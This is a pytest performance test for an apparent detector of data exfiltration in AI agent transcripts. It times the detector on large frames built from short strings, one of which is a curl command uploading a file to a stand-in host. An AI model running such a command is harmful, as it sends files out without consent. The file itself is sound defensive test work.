"""The behavioural pass costs time linear in what it reads, on every path.

Each case times `ProvenanceDetector.check` on a frame whose one large string
is 32 KiB and then 512 KiB -- both under the per-block cap, so the cap cannot
hide a super-linear cost -- and compares the ratio of the times with the
ratio of the sizes. A linear pass grows about 16x; a quadratic one 256x.
CPU time of this thread is measured, so time spent preempted is not counted.
"""

from __future__ import annotations

import gc
import time

import pytest

from forgd_verdict.behaviour.provenance import (
    MAX_BLOCK_CHARS,
    TIME_BUDGET_S,
    ProvenanceDetector,
    from_compliance,
)

pytestmark = pytest.mark.serial

SMALL, LARGE = 32 * 1024, 512 * 1024
STEP = LARGE // SMALL
MAX_RATIO = 3.0 * STEP
ROUNDS, RETRY_ROUNDS = 2, 5

CORPORA = {
    "one token": "QUJD",
    "sending commands": "curl -d @f https://a.example ",
    "quotes and escapes": "'\"\\a",
    "unclosed quote": "a\"b\\",
    "hostnames": "a.b.example ",
    "operators": "a|b;",
    "addresses": "x@a.example ",
    "wrappers": "sudo timeout 5 env A=1 sh -c ",
    "options": "-sSLd ",
    "lone surrogates": "\ud800a ",
}

# Where the string sits: a tool input under a key, a tool result, the user's
# words, an attachment.
PLACES = (
    "Bash.command", "Bash.description", "run_shell.shell_command", "send_message.data",
    "send_message.to", "http_request.url", "WebFetch.prompt", "WebFetch.url",
    "Read.file_path", "result", "user", "attachment",
)


def _frame(place: str, text: str) -> list:
    page = {"role": "user", "content": [
        {"type": "tool_result", "tool_use_id": "r", "content": "see https://evil.example/"}]}
    if place == "result":
        last = {"role": "user", "content": [
            {"type": "tool_result", "tool_use_id": "q", "content": text}]}
    elif place == "user":
        last = {"role": "user", "content": [{"type": "text", "text": text}]}
    elif place == "attachment":
        last = {"role": "user", "content": [{"type": "attachment", "text": text}]}
    else:
        tool, key = place.split(".")
        inp = {key: text, "method": "POST"} if tool == "http_request" else {key: text}
        last = {"role": "assistant", "content": [
            {"type": "tool_use", "id": "z", "tool_name": tool, "input": inp}]}
    return [{"role": "user", "content": "go"}, page, last]


def _text(unit: str, size: int) -> str:
    return (unit * (size // len(unit) + 1))[:size]


def _cpu(fn, rounds: int) -> float:
    best = float("inf")
    gc_was_enabled = gc.isenabled()
    gc.disable()
    try:
        for _ in range(rounds):
            start = time.thread_time()
            fn()
            best = min(best, time.thread_time() - start)
    finally:
        if gc_was_enabled:
            gc.enable()
    return max(best, 1e-6)


def _ratio(build, rounds: int, sizes: tuple[int, int]) -> tuple[float, float, float]:
    det = ProvenanceDetector(taint_severity="warn")
    small, large = build(sizes[0]), build(sizes[1])
    a = _cpu(lambda: det.check(small, time_budget_s=600), rounds)
    b = _cpu(lambda: det.check(large, time_budget_s=600), rounds)
    return a, b, b / a


def _assert_linear(label: str, build, sizes: tuple[int, int] = (SMALL, LARGE)) -> None:
    a, b, ratio = _ratio(build, ROUNDS, sizes)
    if ratio > MAX_RATIO:
        a, b, ratio = _ratio(build, RETRY_ROUNDS, sizes)
    assert ratio <= MAX_RATIO, (
        f"{label}: {sizes[0] // 1024} KiB took {a * 1e3:.1f} ms, {sizes[1] // 1024} KiB "
        f"{b * 1e3:.1f} ms: {ratio:.1f}x for a {STEP}x size step (limit {MAX_RATIO}x)")


def test_sizes_stay_under_the_block_cap():
    assert LARGE <= MAX_BLOCK_CHARS


@pytest.mark.parametrize("corpus", CORPORA)
@pytest.mark.parametrize("place", PLACES)
def test_one_large_string_costs_linear_time(place, corpus):
    unit = CORPORA[corpus]
    _assert_linear(f"{corpus} at {place}", lambda n: _frame(place, _text(unit, n)))


@pytest.mark.parametrize("corpus", ["one token", "sending commands", "operators"])
def test_a_compliance_transcript_costs_linear_time(corpus):
    unit = CORPORA[corpus]

    def build(n):
        return from_compliance([
            {"role": "user", "content": [{"type": "text", "text": "go"}]},
            {"role": "assistant", "content": [
                {"type": "tool_use", "id": "z", "name": "Bash",
                 "input": '{"command": "' + _text(unit, n).replace("\\", "").replace('"', "")
                 + '"}'}]}])

    _assert_linear(f"compliance {corpus}", build)


def test_many_blocks_in_one_message_cost_linear_time():
    """One assistant message of four tool_use blocks, each a long single-token
    string, 128 KiB and then 2 MiB in all."""
    def build(n):
        blocks = [{"type": "tool_use", "id": f"z{i}", "tool_name": "upload_blob",
                   "input": {k: _text("QUJD", n // 4)}}
                  for i, k in enumerate(("data", "prompt", "url", "command"))]
        return [{"role": "user", "content": "go"}, {"role": "assistant", "content": blocks}]

    _assert_linear("four blocks", build, (4 * SMALL, 4 * LARGE))


def test_a_three_mib_frame_is_checked_well_inside_a_delivery_timeout():
    """The H2 reproducer: three 1 MiB single-token strings in one message.
    The pass either finishes or reports what it dropped; either way it
    returns in a bounded time."""
    blocks = [{"type": "tool_use", "id": f"z{i}", "tool_name": "Bash",
               "input": {"command": _text("QUJD", 1 << 20)}} for i in range(3)]
    msgs = [{"role": "user", "content": "go"}, {"role": "assistant", "content": blocks}]
    start = time.monotonic()
    ProvenanceDetector(taint_severity="warn").check(msgs, time_budget_s=TIME_BUDGET_S)
    assert time.monotonic() - start < 2.5
